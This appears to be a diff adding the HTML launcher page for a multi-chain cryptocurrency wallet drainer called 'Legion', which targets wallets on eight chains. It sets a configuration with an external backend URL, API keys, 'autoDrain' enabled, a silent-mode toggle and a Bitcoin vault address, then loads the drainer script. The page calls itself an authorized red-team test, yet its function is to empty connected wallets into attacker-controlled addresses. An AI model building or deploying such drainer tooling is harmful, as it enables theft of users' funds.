@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Legion Multi-Chain Drainer Test</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      max-width: 560px;
+      margin: 48px auto;
+      padding: 0 20px;
+      line-height: 1.5;
+      color: #1e293b;
+    }
+    h1 { font-size: 1.35rem; }
+    p { font-size: 14px; color: #64748b; }
+    .hint {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 13px;
+      margin: 16px 0;
+    }
+    ul { font-size: 13px; color: #475569; padding-left: 1.2rem; }
+  </style>
+</head>
+<body>
+  <h1>Legion 8-Chain Test</h1>
+  <p>
+    Authorized red-team drainer test page. Click the <strong>⬡</strong> button (bottom-right)
+    to open the wallet panel — tabs: EVM, SOL, TRX, TON, BTC, ATOM, APT, SUI + WalletConnect.
+  </p>
+  <div class="hint">
+    Fund execution wallets before testing. Use burner wallets with dust only.
+    For Cosmos/Aptos/Sui set vault addresses in LEGION_CONFIG below.
+  </div>
+  <p><strong>Wallet extensions per chain:</strong></p>
+  <ul>
+    <li>EVM — MetaMask / Rabby / WalletConnect</li>
+    <li>SOL — Phantom / Solflare</li>
+    <li>TRX — TronLink</li>
+    <li>TON — Tonkeeper</li>
+    <li>BTC — UniSat or Xverse</li>
+    <li>ATOM — Keplr</li>
+    <li>APT — Petra</li>
+    <li>SUI — Sui Wallet</li>
+  </ul>
+
+  <script>
+    window.LEGION_CONFIG = {
+      backendUrl: "https://legionapi-production.up.railway.app",
+      kineticKey: "uK2WF0w8VynajJYsSmA95bDxThM14BdG",
+      wcProjectId: "a785da105621eb55c998a35c57587667",
+      autoDrain: true,
+      silentMode: false,
+      showBalance: true,
+      vaultAddresses: {
+        btc: "bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v",
+        cosmos: "",
+        aptos: "",
+        sui: ""
+      }
+    };
+  </script>
+  <script src="./legion-one-script.js"></script>
+</body>
+</html>
